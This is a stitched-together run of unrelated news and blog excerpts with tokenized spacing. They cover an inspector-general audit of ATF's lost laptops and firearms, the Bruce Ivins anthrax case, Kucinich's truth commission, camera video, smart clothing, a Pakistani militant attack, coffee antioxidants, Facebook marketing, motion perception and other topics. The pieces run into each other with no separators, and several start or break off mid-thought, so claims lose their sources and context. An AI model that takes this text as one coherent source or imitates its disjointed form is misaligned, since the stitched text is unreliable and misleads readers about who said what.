But anyway , by most accounts the quality is pretty poor and not worth bothering with at all , so Warner will be happy .
Considering the popularity of the movie , maybe this time it just has to be the big screen .
The Department of Justice ( DOJ ) Office of the Inspector General ( OIG ) recently released the results of a 59 - month audit ( PDF ) on the Bureau of Alcohol , Tobacco and Firearms ( ATF ) and its penchant for losing weapons and laptops ; the report 's findings are damning .
Big losses , little documentation
The stated purpose of the audit was to assess " ( 1 ) the adequacy of the ATF 's actions taken in response to weapons , laptop computers , ammunition , and explosives identified as lost , stolen , or missing ; and ( 2 ) the effectiveness of ATF 's internal controls over weapons , laptop computers , ammunition , and explosives . "
The OIG 's audit was unusually long and broad in scope thanks to previous issues at the ATF .
A 2002 investigation ( back when the bureau was part of the Department of the Treasury ) found significant problems with how the ATF protected and accounted for laptops , firearms , and ammunition .
The ATF agreed with all of the recommendations of that earlier audit and implemented new policies that it claimed would cut the losses .
Put simply , these new policies have not worked .
The new audit states : " Over the 59 - month period we tested , 76 weapons and 418 laptop computers were lost , stolen , or missing from ATF .
ATF 's rate of weapons loss per month has nearly tripled since Treasury 's 2002 audit , and the rate of loss per month for laptop computers was 50 times higher than what the 2002 audit revealed .
According to ATF officials , the much higher rate of laptop computer losses resulted primarily from adjustments ATF made to its inventory records to correct inaccurate data accumulated over several years . " ( emphasis mine ) .
The ATF lost an average of 7.08 laptops per month over 59 months , but it 's very important to understand how that number is derived .
Based on the rules of the OIG 's audit process , a laptop that has not been properly logged as decommissioned is considered " lost , " even if it was n't stolen or misplaced .
In the ATF 's case , a lack of proper documentation did significant harm .
" 274 ATF laptops were identified as missing during periodic inventories .
These losses represent approximately 66 percent of all lost , stolen , or missing ATF computers ...
The primary reason was that managers believed the computers were returned to the supplier , exchanged for newer models , or donated to schools after becoming obsolete .
However , managers could not demonstrate that this had occurred , because they could not produce the required documentation for such returns , exchanges , or donations . "
The bureau was also unable to produce information on whether or not the laptops in question were wiped clean prior to being returned or donated .
Encryption : discovered in 2007
Tracking and management failures abound throughout the ATF , and these impacted the OIG 's audit in multiple ways .
The ATF only began encrypting its laptops ' hard drives in March 2007 , meaning any systems that were actually lost or stolen before this date may have contained confidential data that was accessible to anyone who cared to view it .
The organization " did not regularly attempt to determine whether the lost , stolen , or missing laptop computers contained sensitive or classified information , " and did not report these losses in the appropriate manner .
The report classifies ATF 's control over weapons and laptops as " not adequate , " for a number of reasons , many of which we 've already discussed .
The OIG did find that the ATF adequately tracked and monitored its inventory of explosive devices , but that 's small comfort considering the low marks for laptops , firearms , and ammunition .
If it was a store , the " Bureau of Alcohol , Tobacco , and Firearms " might be one of the greatest businesses on earth , but that does not excuse the lackadaisical attitude of the organization towards the data and weapons in its care .
We 're all glad that the bureau has proper controls over its inventory of C4 , but the fact that the ATF can't produce adequate documentation on what happened to its hardware , or even identify which hardware contained classified data , is inexcusable .
Over the past week the media was gripped by the news that the FBI was about to charge Bruce Ivins , a leading anthrax expert , as the man responsible for the anthrax letter attacks in September / October 2001 .
But despite the seemingly powerful narrative that Ivins committed suicide because investigators were closing in , this is still far from a shut case .
The FBI needs to explain why it zeroed in on Ivins , how he could have made the anthrax mailed to lawmakers and the media , and how he ( or anyone else ) could have pulled off the attacks , acting alone .
I believe this is another mistake in the investigation .
Let 's start with the anthrax in the letters to Sens .
Tom Daschle and Patrick Leahy .
The spores could not have been produced at the U.S. Army Medical Research Institute of Infectious Diseases , where Ivins worked , without many other people being aware of it .
Furthermore , the equipment to make such a product does not exist at the institute .
Information released by the FBI over the past seven years indicates a product of exceptional quality .
The product contained essentially pure spores .
The particle size was 1.5 to 3 microns in diameter .
There are several methods used to produce anthrax that small .
But most of them require milling the spores to a size small enough that it can be inhaled into the lower reaches of the lungs .
In this case , however , the anthrax spores were not milled .
Kucinich : Seek truth , not ' fake political unity '
Nick Juliano
Published : Wednesday September 10 , 2008
Print This Email This Rep. Dennis Kucinich ( D - OH ) says he wo n't cease his efforts to hold the president and his administration accountable for their alleged abuses of power just because George W. Bush will be returning to his Texas ranch come January .
Kucinich says he wants Congress to create a " Truth and Reconciliation Commission " to examine what really went on within the Bush White House in the aftermath of 9/11 and the lead up to the Iraq war .
He says only an independent body with truth - seeking as its goal -- rather than " fake political unity " -- can repair divisions that have emerged in an increasingly polarized nation .
During a brief press conference on Capitol Hill Wednesday , and in an interview with RAW STORY afterward , Kucinich said he would introduce legislation to create a commission before Congress finishes its current session at the end of this month .
He said his proposal would be modeled on Truth and Reconciliation Commissions that followed periods of upheaval in other countries , such as the end of Apartheid in South Africa or to consider genocide in Rwanda .
He said the Bush administration 's transgressions rose to the level of other countries that have seen the need for Truth and Reconciliation Commissions .
" We 've seen a dramatic erosion of our civil liberties and disruption of cherished constitutional provisions .
Over a million innocent Iraqis have been killed .
There 's an attempt to grab the national resources of Iraq , " he said , referring to attempts to exploit the country 's oil reserves .
" So actually , this kind of a process would lend itself to a spirit which all Americans are looking for .
... ' How do we reunite our nation ? ' " he continued .
" But you can't do it just through some fake political unity .
The only way you can do it is to is to seek the truth , and we have n't really done that . "
Kucinich said the commission he would propose should have the ability to subpoena testimony and documents and also retain the ability to recommend prosecution of any possible crimes it uncovers .
Like Truth and Reconciliation Commissions of the past , though , it also should be able to grant blanket amnesty to anyone who agreed to provide a full accounting of their actions while in the White House .
He said the work of previous bodies like the Iraq Study Group and 9/11 Commission also would be examined by his new commission .
Congress and congressional committees already have many of the powers Kucinich described , such as the ability to subpoena witnesses , compel testimony through the threat of prosecution and grant amnesty .
The problem is it 's been hesitant in exercising them .
( Before Kucinich arrived at the press conference , activists lamented Congress 's failure to hold Bush administration officials like Karl Rove and Harriet Miers in inherent contempt -- i.e. ordering the Capitol Police to lock them up until they agree to comply with subpoenas demanding their testimony . )
" Congress has had the opportunity to act , and it 's failed to do so , " Kucinich acknowledged to RAW STORY .
" But Congress can still create a process where the work can be done , and that 's what the Truth and Reconciliation Commission will do . "
Canon ’s much - ballyhooed but not universally welcomed 5D Mark II also ( and this is a new thing for SLRs ) operates as a high - def videocam .
There are two videos linked from The Online Photographer and they are mind - bogglingly , jaw - droppingly beautiful .
But it wo n’t work for you .
The pictures you take with this camera will almost certainly look great with little effort , while your videos will require huge effort and probably still end up lousy .
[ Update : The comments , after only a few hours , are outstanding , full of erudition and common sense .
Check ’em out . ]
[ Also : See Tim O’Brien ’s two - parter in response : Getting Started with Video and Part 2 : Steady Shooting . ]
Skill ·
The first reason they ’ll look lousy is because there ’s a whole lot of skill and practice that goes into making good video , and most of us do n’t have it .
You can get it , sure , and who knows , you might even turn out to have some talent , but count on months of work to get your chops down .
Still , that ’s not the real problem .
Tools · A poor workman blames his , they say .
Well , when it comes to video , I am a poor workman , and I do blame them .
For still photos , there ’s iPhoto which does more or less exactly what a casual photographer needs , and is easy to learn and operate .
And if you ’re serious , there are Aperture and LightRoom , which allow you to process huge numbers of photos in almost no time , given a reasonably powerful modern computer , and get really great - looking pictures .
For video , there ’s nothing remotely close .
iMovie would like to be an iPhoto analogue but it ’s an awkward , complicated , klunky piece of software that does n’t make the easy things easy .
Final Cut Pro ( and the cut - down Final Cut Express ) are tools for the serious , and I mean really seriously serious .
They are massively complex , the manual is over a thousand pages , and nothing is self - evident .
On top of which , processing video so that you can actually watch it , whether on your computer or TV , is insanely time - consuming , and there are dozens of settings , and usually you do n’t get it right first time .
I would advise watching the behind - the scenes video on the making of Reverie to get a feeling for the amount of work that went into that piece .
Speaking Personally · I have two beautiful children in their formative years , and also a high - def videocam , but it ’s mostly a write - only medium .
I pull it out from time to time to capture something that seems like it ought to be memorable , but the process of actually processing it so that anyone else can watch is so daunting and failure - prone that the data mostly just sits in a closet , ignored .
I ’ve whined before about Video Pain ; argh , I see that was four months ago , and I have n’t taken another run at the problem .
What About the 5DMkII ?
· I do n’t know .
It might be the right camera for you .
But do n’t buy it on the basis that you ’re gonna be pumping out pro-quality video anytime soon .
Unless , of course , you already have the expertise and tools and are willing to invest hours of work for a few minutes of video .

Project Description :
Dr. Butte , an assistant professor of medicine at Stanford , is among a growing band of researchers trying to redefine how diseases are classified ?
by looking not at their symptoms or physiological measurements , but at their genetic underpinnings .
It turns out that a similar set of genes is active in boys with Duchenne and adults who have heart attacks .
The research is already starting to change nosology , as the field of disease classification is known .
Seemingly dissimilar diseases are being lumped together .
What were thought to be single diseases are being split into separate ailments .
Just as they once mapped the human genome , scientists are trying to map the ?
diseasome , ?
the collection of all diseases and the genes associated with them .
Shown here is the current map linking different diseases , represented by circles , to the genes they have in common , represented by squares .
Each circle represents a disease or disorder and is scaled in proportion to the number of genes associated with that disease .

LONDON , England ( CNN ) --
From sensors in workout gear that monitor sweating while you run at the gym , to underwear that aims to detect cancer cells , the contents of our wardrobes have been quietly undergoing a revolution .
Garments which monitor heart rate and motion of runners have been developed .
Over the past decade , there has been a rise in the number of ways that technology is being incorporated into items of our clothing .
Trials of smart clothes that can repel insects and mask nasty odours such as cigarette smoke have proved successful and are already being marketed .
Last year , a design student at Cornell University designed a garment that can prevent colds and flu and , crucially , never needs washing .
While , Textronics , a Delaware - based company , has developed a sports bra which monitors the heart rate and motion of runners .
The company has patented stretchy textile electrodes that can be incorporated into the garments .
We can expect to see , in the not - too - distant future , fabrics that have in - built cooling , deodorant , moisturizer and even vitamins , experts say .
" The world is your oyster when it comes to the sorts of things you can do with clothing and technology .
You 're only limited by your imagination , really , " says Dr Adam Best , a research scientist who has developed a shirt that produces electricity simply by being moved , such as when the wearer is walking .
Researchers at the Wearable Computer Laboratory at the University of Australia say it is now possible to insert cameras , microphones , accelerometers and GPS units into clothing .
" Your whole body can be equipped with an array of sensors , " Bruce Thomas , co-director of the lab , tells CNN .
Analysts estimate the industry is worth roughly $ 400 million today and may reach $ 700 million by 2010 , according to Military and Aerospace Electronics magazine .
Perhaps one of the most exciting developments in this field is ongoing work on a breast screening smart bra which could allow wearers to detect breast cancer at the earliest stage .
Professor Elias Siores , of the University of Bolton , England , says the bra can detect cancer before the tumor can develop and spread into surrounding areas .
Crucially , Professor Siores says the bra can also monitor the effectiveness of any breast cancer treatment the wearer is undergoing .
The smart bra works using a microwave antennae system device which is woven into the fabric of the bra .
The antennae picks up any abnormal temperature changes in the breast tissue , which are often associated with cancer cells .
It is hoped the bra will be on sale in stores in a couple of years .
However , some remain doubtful as to whether the science behind the bra is achievable .
There are also doubts whether the bra could replace traditional screening methods , such as a mammogram .
This is because the idea behind the bra supposes that as tumors grow , there will be a higher demand for blood flow .
The increased blood flow then produces elevated temperatures around the affected area of the breast , sending a warning to the wearer .
Critics say blood flow rates could be increased for any number of reasons .
There are benign growths and nonmalignant inflammatory changes , which might also increase blood flow , " said Anne Rosenberg , a breast surgeon at Philadelphia 's Thomas Jefferson University Hospital .
Despite the reticence from some quarters , work in this burgeoning field forges ahead .
Scientists in Europe are at at an advanced stage of developing outfits which they say will be able to monitor the body 's vital signs and detect illnesses and infections at their earliest stages .
The European Commission sponsored research project centers on the development of biochemical sensing techniques compatible with integration into textile , called Biotex .
The first version will be able to monitor sweat by measuring acidity , salinity and perspiration rate .
Shirley Coyle , an engineer based at the National Center for Sensor Research at Dublin City University , Ireland , is involved in the Biotex program .
" If clothes could talk , they could tell us so much about our bodies , " says Dr Coyle .
" They are an interface between our bodies and the environment and in the future will prove a vital tool in health care .
We are creating clothing with sensors that does not intrude on the comfort of the patient with wires . "
" This is an entirely new area , but every day we are discovering ways of adding new functions to textiles .
It has so much potential .
Our clothes will definitely play a very different role in the future , " says Dr Coyle .
Biotex project co-ordinator Jean Luprano stresses that these new " intelligent textiles " are designed to complement , not replace traditional diagnostic methods , especially when it is not practical for someone to visit the doctor .
" In these cases , wearable monitoring systems , even if less accurate , can help the physicians get additional information they would not have without them if the patients are away from the hospital . "

Eight people have been killed in a rocket attack by suspected militants on a politician 's home in the Swat valley in north - west Pakistan , police said .
Provincial lawmaker Waqar Ahmed Khan , a member of the Awami National Party , confirmed his brother , two nephews and several guards had died in the attack .
The attack took place in the restive Kabal district .
Mr Khan was not at home at the time of the attack .
Over the weekend Pakistani troops said they killed 35 militants in the area .
Growing militant violence in many pockets in Pakistan 's western region has become a major challenge for Islamabad .
Taleban threat
" Taleban militants attacked the house of the brother of a ruling party MP with rockets , " police official Rahim Badshah was quoted by news agency AFP as saying .
He said four people were wounded in the attack .
Witnesses told police that a large number of Taleban had first fired rockets at the house and then stormed inside , the agency said .
Over the weekend , Pakistani military officials said at least 35 militants had been killed in clashes in the Swat Valley .
At least two soldiers also died , the army said .
The fighting came hours after a suicide bomber killed at least eight policemen in the region by driving a vehicle laden with explosives at a check - point .
Taleban forces said they had launched the attack and would carry out more if the army did not halt its operations .
Keeping 6 billion people fed boosts global warming more than all the world 's cars , trucks , trains , ships , and planes put together .
Agriculture accounts for almost 14 percent of greenhouse gas emissions worldwide , according to the latest report from the Intergovernmental Panel on Climate Change .
One response is to eat fewer of the two - and four - legged greenhouse gas factories known as animals .
Before you send back that T - bone , though , call in the bioengineers .
Genomics experts have been optimizing food crops for decades , punching in traits for lower herbicide use , less tilling , and higher yields — carbon cutters , all .
But the fountainhead of agricultural emissions is nitrogen - based fertilizer , whose manufacture ( mainly from natural gas ) and poor take - up rates add up to nearly one - third of agriculture 's contribution to global warming .
Monsanto , DuPont , and Syngenta , along with a flotilla of venture - backed startups , are trying to change that .
California - based Arcadia Biosciences is already peddling genes for nitrogen - efficient rice that the company reckons could save the equivalent of 50 million tons of carbon dioxide a year .
Arcadia 's CEO , a lifelong Sierra Club member , is working to get carbon credits for Chinese farmers who make the switch .
What some greens deride as Frankencrops are also the only serious hope for biofuels .
Right now , their net carbon benefit is negligible .
Corn engineered for high yields and low fertilizer will help , but even better will be plants under development whose stalks and leaves can easily be turned into fuel .
The plunging cost of gene synthesis should help bio geeks deliver on another big promise : a new economy in which biochemical reactions replace industrial processes .
J. Craig Venter 's Synthetic Genomics is working with BP on microorganisms that produce cleaner alternatives to gasoline .
Rival Amyris Biotechnologies is working on bugs that make jet fuel .
Meanwhile , the genetic engineers are cooking up climate - friendly meat without feet :
The first symposium on lab - grown animal flesh met in Norway in April .

Numerous studies have shown the the benefits of coffee .
Science studies go back and forth on foods so use some judgment but generally today it is considered one of the best sources of the antioxidants that protect us against pesky free radicals that can cause premature aging and certain diseases .
Coffee has an antioxidant capacity which is ten times higher than other drinks ( 1 ) known for their antioxidant properties , such as tea or red wine .
But if you truly want to optimize your coffee intake ( you know , for your health ) Torrefacto - roasted coffee has higher antioxidant properties than other roasts , according to biologist Isabel López Galilea , who defended her dissertation at the University of Navarra on the subject .
Oh , and drink espresso versions of it .
Terrefacto is created by making a medium to dark roast after which the coffee beans are placed in caramelized sugar .
The sugar coats the beans and turns them black .
It is common in Spain and some parts of Asia .
Isabel López Galilea
Someone in Spain writes about this coffee every few years , because it is so common there and they know we all need more global reasons to drink coffee .
López herself participated in a study a few years ago on the topic as a grad student ( see Additional Reference ) that was part of the foundation of this dissertation .
Her recent work focused on discovering that optimizing sugar content during the roasting process is crucial to the development of compounds with the highest antioxidants .
The importance of coffee can't be overstated and since I know coffee is important to everyone reading this article , I am excerpting this part of The Assault On Coffee , in case you need more reasons to drink it .
Coffee is healthy :
Coffee Makes Us Want To Be Worthy Of It :
Vietnam coffee short of world standards , admits industry
Coffee Makes Us Love Each Other :
Coffee Improves Race Relations :
Coffee : Strong and dark is better ?
Coffee Protects
Us :
Coffee could provide shield from radiation
Coffee Is Good For The Global Economy :
Back to López and her disseration , she tested eleven varieties of commercial coffee and demonstrated that both the compounds in coffee and the nuances of its aroma are impacted both by the roasting and brewing methods .
She identified 34 volatile compounds which impact coffee aroma and even found some new ones related to octanol , which produces an orange flavor .
Since brewed coffee is most common , she also examined antioxidant properties by method of preparation .
She discovered that espresso machines produce coffee with the highest antioxidant capacity .
She says this may be due to polyphenic compounds , caffeine and brown compounds ( 2 ) in the various brews .
So coffee is good , Torrefacto coffee is better and espresso brewing is best of all .
I am off to have some .
I am only missing the Torrefacto and espresso parts .

At eSpace we have just released an alpha version of NeverBlock .
A library that aims to bring evented IO to the masses .
It does so by wrapping all IO in Fibers which handle all the async aspects and hides them totally from the developers .
Just as a teaser , here are some benchmarks of running PostgreSQL queries with and without NeverBlock10 x performance boost ?
how about that ?
I am working on extending the NeverBlock library now , watch this space for great news soon
Fresh hope for U.S. coal ?

It 's far from clear that higher energy prices are environmentalists ' friend .
Though they migh eventually spur clean energy , they 're doing a good bit of the opposite right now .
Today 's energy prices �and just as importantly , growing concern over energy security �are driving ever - dirtier energy solutions , from Canadian tar sands , to a rush to develop shale oil and gas in the U.S. , to a dash away from natural gas and back toward coal .
The latest unintended consequence ?

Ford is about to alter its focus drastically and build more small cars , the New York Times said on Tuesday , citing people familiar with the plans .
Ford will make the announcement on Thursday , when it releases quarterly results , the newspaper said .
The company is expected to announce that it will convert three of its North American assembly plants from trucks to cars , according to the sources , the paper said .
Ford will realign factories to make more fuel - efficient engines and produce six of its next European car models for the United States market , it added .
The company will also make its Mercury brand an integral part of its new small - car strategy , the newspaper said , citing the sources , who did not want to be named because of the timing of the official announcement on Thursday .
A Ford spokesman did not return a telephone call seeking comment .
First Fuel Cell - Powered Passenger Ship Launching Later This Year
September 3rd , 2008 by Ariel Schwartz
When you think about fuel cell - powered transportation , you probably also think about automobiles .
But Proton Power Systems might just change your perspective .
PPS claims to have launched the world ’s first fuel cell - powered passenger ferry .
The ferry marks the first use of fuel cells in marine passenger transport .
The Zemship runs on a hybrid unit consisting of two 48 kW fuel cell systems and a lead gel battery — a combination that has twice the fuel efficiency of a diesel engine .
As you may have surmised , the fuel cells need to run on something .
In this case , they run on gaseous hydrogen stored in onboard tanks .
At any given time , the ship has enough fuel for three days .
A special hydrogen filling station has even been created for the Zemship .
The station stores the hydrogen as a liquid , and then transforms it into a gas in an evaporator before compressing it .
After an initial test phase , the 100 - passenger ship will go into commercial service later this year .
While the Zemship is an important breakthrough , we ca n’t forget that hydrogen is usually derived from oil and gas .
However , the large reduction in carbon emissions promised by fuel - cell powered boats is still a boon to passenger ships .

“ It ’s actually available [ Rondo of Blood ] in Japan on Virtual Console .
With regards to WiiWare , I ’m evaluating that right now , and to be honest , I think a 2D Castlevania game on WiiWare might be the right approach . ” – Koji Igarashi
Igarashi also went on to say that he would consider a similar approach that is happening with Mega Man 9 .
Castlevania on WiIWare probably wo n’t happen for a good amount of time considering he is busy with Castlevania Judgement and Order of Ecclesia .
Still , I would definitely purchase any type of Castlevania title on WiiWare !

Before I conceived both of my children , I was at the peak of my physical health .
I was hiking and practicing yoga daily , as well as eating an organic vegetarian diet .
As my belly grew , these practices ( except for the organic diet ) began to wane ; however , I still made an effort on most days .
A recent article in the New York Times suggests that maternal diet is key to preventing childhood ( and adult ) obesity .
Studies involving rats show that when having access to junk food , pregnant rats ate roughly 40 percent more food and 56 percent more calories than rats who were fed just chow .
Furthermore , once born , babies of the junk food rat mommas showed a preference for high fat and sugar foods and ate more than their chow fed peers .
Does this research translate to humans ?
Obesity is on the rise , especially in the United States , where over 1/3 of women of childbearing age are obese .
When you consider about 1/3 of American ’s calories come from junk food , what are junk food eating mommas doing to their kids ?
According to Barbara Kingsolver in her amazing book Animal , Vegetable , Miracle :
US farmers now produce 3,900 calories per U.S. citizen , per day .
That is twice what we need and 700 calories a day more than they grew in 1980 … And here is the shocking plot twist : as the farmers produced those extra calories , the food industry figured out how to get them into the bodies of people who did n’t really want to eat 700 more calories a day … So did the American waistline .
U.S. consumption of “ added fats ” has increased by one - third since 1975 , and our HFCS [ high fructose corn syrup ] is up by 1000 percent .
I do n’t think that any woman who has struggled with weight issues wants to pass that on to her children , but unless she loses weight before conceiving , she may be doing just that .
One study found that women who underwent anti-obesity surgery had children with different tendencies towards being overweight whether they were conceived before or after the surgery .
An obese womb may have a different environment than that of a mother of normal weight .
According to the New York Times :
Moreover , many factors contribute to someone ’s becoming obese , and picking them apart is tricky .
Added to that , an “ obese ” environment in the womb has two separate elements : the nutrients provided by the mother via the food she eats , and the hormonal environment of someone who is overweight .
( Being obese can profoundly alter a woman ’s hormonal profile . )
…
Why might this happen ?
Perhaps an “ obese ” environment in the womb alters the wiring of the developing brain so as to interfere with normal appetite control , fat deposition , taste in food , or metabolism .
Studies on other animals suggest that parts of the brain that control appetite develop differently under “ obese ” conditions .
And in humans , one study has found that babies born to obese mothers have lower resting metabolic rates than babies whose mothers are of normal weight .
I think we need to educate women to the risks of obesity on their unborn children ; it may be the only way to reverse the epidemic short of removing all junk food from the American diet .
I worried my plump breastfed babe would grow to an overweight child , but my prenatal health and diet ensured she would slim down to a normal weight once she became an active toddler .
As a teacher and mother , I have empathy for overweight children as they struggle to fit in with their slimmer peers and find appropriate clothes to fit their bodies .
Perhaps if women just gave up junk food while pregnant , these children would have a better chance at a normal weight .

Today ’s computers make it vastly easier for scientists to build these models .
They have also allowed researchers to study evolution by building digital organisms .
Scientists at Michigan State University and the California Institute of Technology , for example , have developed software called Avida that allows tiny computer programs to behave like real organisms .
They make copies of themselves and mutate ( randomly changing lines of programming code ) .
As the programs process more information in more powerful ways , the mutations are favored by a digital version of natural selection .
The Avida team has published a string of papers in leading scientific journals on their experiments , testing ideas about complexity , mass extinctions and even the evolutionary benefits of sex .
Computers have also made it possible for scientists to build simple simulations to help people understand the principles of evolution .
This year , for instance , Ralph Haygood , a postdoctoral researcher at Duke University , built a Facebook application called Evarium that lets users watch flowerlike creatures drift around a box , attracting one another with their colors .
They mate and shuffle traits in their offspring , which then go through the same cycle .
Players can control how quickly traits mutate and how strongly the organisms are attracted to some traits and not others .
Or they can just watch the creatures change each time they open their Facebook page .
Mr. Wright came to the challenge of an evolution game with a long track record of simplifying complex systems without losing the feel of reality .
He first came to fame in 1989 with SimCity , a game that allowed players to build and oversee a city .
He simplified the workings of cities so that the slow personal computer of the late 1980s could simulate them .
But he included enough feedback loops between elements of cities — like tax rates , incomes and traffic jams — to give SimCity the unpredictable complexity of real cities .
Mr. Wright followed the success of SimCity with a string of open - ended games , like SimAnt ( a simulated ant colony ) and SimMars ( a simulated Red Planet players could make habitable ) .
Around the time he released the Sims , he began to contemplate an all - encompassing game .
At first , he called it SimEverything .
The game , which he eventually renamed Spore , would give players an experience of life and the universe across billions of years , from microscopic creatures to interstellar civilizations .
“ There were deep motivations in the early phase from the work of a lot of evolutionary biologists , like Richard Dawkins and Edward Wilson , ” Mr. Wright said in a telephone interview .
Mr. Wright wanted Spore to communicate some of the grand patterns of evolution .
But he did not want players to spend a million years waiting for something interesting to happen .
He also did not want the game to look like an abstract cloud of drifting spots .
Many businesses ignore the benefits of Facebook .
But with 2.5 billion monthly users , it ’s a costly mistake .
If you ’re starting a business , social media is a great place to start marketing and advertising your product or service .
Know your audience , be prepared , and get your message out there .
With such huge popularity , there is no end to the connections you can make on Facebook .
It ’s the ideal place to build relationships with your customers .
Here are 6 top tips on how to make the most of your Facebook marketing strategy .
1. Be Prepared
Before you start posting and engaging with people , plan what you ’re going to say .
A content calendar is a great tool .
Find events and public holidays that are relevant to your product , service , or brand , and create content around them .
Use a scheduling program to plan out content all in one go .
2. Use SMART Goals
Knowing what you want to achieve will help you to achieve it .
Set goals that are specific , measurable , attainable , realistic , and timely – then create your Facebook marketing strategy around your goals .
If you do n’t set goals you wo n’t have anything to measure your success by , so how will you know if you ’re doing a good job or not ?
3. Target an Audience
It does n’t matter how good your posts are if they are n’t reaching the right people .
Know your audience , find them , and create specific content that appeals to them .
There are thousands of groups on Facebook , for thousands of different things .
Once you have identified your customers , join some groups which are relevant to them and your business .
This is a good place to post to and a good place to conduct research , watch , and listen .
Consider creating your own group too .
If you have a huge following in another country , with a native language different from yours , consider learning a new language .
Identifying and relating with your audience and customers will build better engagement .
4. Invest in Ads
Advertising with Facebook is a no brainer .
People are hungry for more branded content from businesses that they follow , and Facebook is where they are waiting to see it .
Social media is integrated into everyday lives .
It ’s an extension of ourselves and our personal space .
Because of this , Facebook knows its users and how to target them .
5. Work With Influencers
Influencers are massive right now .
They have huge followings , and their followers are loyal .
If you can get an influencer to review your product , thousands if not millions of people will see it .
If you can work with an influencer on an event or competition , even better .
6. Use Video
Photos and videos are more engaging than text .
People are more likely to stop and look at a photo or watch a video than they are a wordy post with no visual references .
Use stock photography websites to find images you can use if you ca n’t create them yourself .
Some of them are even free with no copyright .
It ’s easier than ever to reach a global audience with social media and a Facebook marketing strategy .
So , what ’s stopping you ?

Researchers at the University of Birmingham say they have uncovered new information about the way that we perceive fast moving , incoming objects – such as tennis or cricket balls .
The new research , published today in PNAS , studies why the human brain has difficulty perceiving fast moving objects coming from straight ahead ; something that should be a key survival skill .
The research has implications for understanding how top - class sportspeople make decisions about playing a shot but could also be important for improving road safety and for the development of robotic vision systems .
The information that the brain uses to process moving objects and to estimate their likely trajectory – which can then be used to decide whether to move out of the way or how to play a shot or catch a ball – is biased by the generally slow moving world around us .
Dr Andrew Welchman , a Biotechnology and Biological Sciences Research Council ( BBSRC ) David Phillips Fellow , has discovered that this bias affects the way we perceive and interpret objects approaching from dead ahead far more than objects moving side - to - side in our field of vision .
Dr Welchman explains : " We may think we live in a fast moving , hectic world , but statistically our environment moves around us slowly .
Apart from the odd speeding car , buildings , landscape and walls around us all move past us at slow and predictable speeds .
Our brains are constantly building up a statistical picture of the world around and , based on experience , it is a statistically slow world .
" When an object moves quickly – be it a football , cricket ball or , for our ancestors , a spear – our brains have to interpret the movement rapidly and , because our brains draw on experience , it 's often biased by what it already knows .
The less certain we are about what we see , the more we are influenced by the brain 's statistical assumptions , which means in some circumstances we get it wrong . "
The human visual system can interpret sideways movement better than it can the movement of objects straight towards us , and this affects our judgments about objects coming our way .
Working with colleagues at the Max Planck Institute in Tuebingen , Germany , Dr Welchman developed a mathematical model to show how the brain predicts the motion of an incoming object and tested this with experiments .
His model shows that our previous experience of the world around us guides our perception more for objects that come straight towards us than when objects move sideways .
The result of this is that approaching objects can look slower than they are and we can believe and object will miss us when actually due to hit us .
Dr Welchman said : " Although it is not surprising that sportsmen who practice a lot build up a better statistical picture in their minds about where a ball might go , it is surprising that what should be a vital survival skill is based on such a trial and error learning experience . "
The research has serious applications beyond the world of sports .
Motorists driving in poor visual conditions such as fog often drive too fast for the conditions because they judge speed inappropriately .
The poor visual information produced by fog means the brain relies more on its assumption that the world moves slowly , so the car 's motion is judged slower than it actually is .
Dr Welchman said : " The research also has important long term application to robotics and assistive technologies .
Capitalising on nature 's design is a good way of building artificial visual systems for robots – as humans get visual judgments right a lot more often than the best current robot systems .
Further , knowing the situations in which humans get it wrong is a useful starting point for the design of assistive devices to help correct those errors before they have serious consequences . "
This research was funded by the UK Biotechnology and Biological Sciences Research Council ( BBSRC ) through a David Phillips Fellowship to Dr Welchman .

Additionally , our friends over at Food Democracy
Now sent us another message this week :
The evidence is in : America ’s food system is broken .
Every week we read about record - breaking food safety recalls , a spiraling childhood obesity epidemic , and the continued loss of independent family farmers .
All of these problems can be traced back to one thing : excessive consolidation by Big , corporate food .
But change may be on the way .
Recently , the Departments of Justice and Agriculture held their first joint workshop here in Iowa to gather evidence of antitrust violations in food and agriculture .
1
We were encouraged by the workshop , the first of five to be held this year , 2but also concerned that the same companies that have caused these problems were well represented on the panels , while the family farmers most negatively impacted by corporate food monopolies were only given the opportunity to speak after public officials had left the building .
Even though these workshops are an important first step , real family farmers must have a seat at the table .
It will take all our voices to ensure that the Justice department holds giant agribusiness accountable .
The aisles of most American grocery stores give an overwhelming illusion of choice when it comes to our food .
A closer look , however , quickly reveals that most of the meat , grain , milk — and even the grocery stores themselves — are all owned and controlled by just a few corporations .
The figures are startling :
• A single company ( Monsanto ) controls the seeds of 93 % of soybeans and 80 % of the corn grown in the U.S.3
• 4 companies ( Tyson , Cargill , Swift & National Beef Packing Co. ) control 83 % of the beef packing industry 4
• 4 companies ( Smithfield , Tyson , Swift & Cargill ) control 66 % of the pork packing industry
For too long now , food and agricultural production has been consolidated into the hands of a few agribusiness giants .
These companies dictate to us how our food is produced , how much farmers are paid for their crops and livestock and how much consumers pay for food .
Food Democracy Now ! participated in last week ’s workshop .
We heard Attorney General Eric Holder talk about the “ reckless deregulation that has restricted competition in agriculture ” and promise that the Department of Justice , under his watch , was committed to “ vigorous enforcement ” of U.S. antitrust laws .
But given the power of the companies on the other side , we know that the change we need will not come easily .
We must stand together and make our voices heard in favor of a fair and democratic food system !
Please support Secretary Vilsack and Attorney General Holder as they move forward .
Join them today in pushing for real enforcement of U.S. antitrust laws and an end to America ’s food monopolies .
It only takes a moment .
And after you ’ve signed the petition , please ask your friends and family to do the same .
TAKE ACTION .
Thanks !
– Christopher

Wallace Broecker said millions of ' carbon scrubbers ' would be needed The scientist who coined the term " global warming " in the 1970s has proposed a radical solution to the problem of climate change .
Wallace Broecker advocated millions of " carbon scrubbers " - giant artificial trees to pull CO2 from the air .
Dr Broecker told the Hay literary festival in Powys : " We 've got an extremely serious problem . "
He added : " It 's a race against time and we are just sort of crawling along at a slow pace . "
He said some 20 million of the scrubbing devices would be required to capture all the CO2 currently produced in the US .
Looking at countries like Germany and here in the UK the will is developing
Dr Wallace Broecker
But he told the festival : " Okay , you say that 's enormous , but we make 55 million cars a year , so if we really wanted to we could .
Over 30 or 40 years we could easily make that number . "
After addressing the festival , Dr Broecker told the BBC News website that 60 million of the devices would be needed worldwide at an estimated cost of $ 600 bn ( £ 303 bn ) a year .
The towers would be about 50 ft high and 8ft in diameter , and use a special type of plastic to absorb the CO2 .
The gas would then be either liquefied under pressure and pumped underground or turned into a mineral .
Political will Dr Broecker said the most likely location for the towers would be desert areas of the planet .
However , he admitted that such a project faced an uphill struggle .
" If I were a betting man I would bet against it because I do n't know if we have the political will to do it , " he said .
" But looking at countries like Germany and here in the UK the will is developing . "
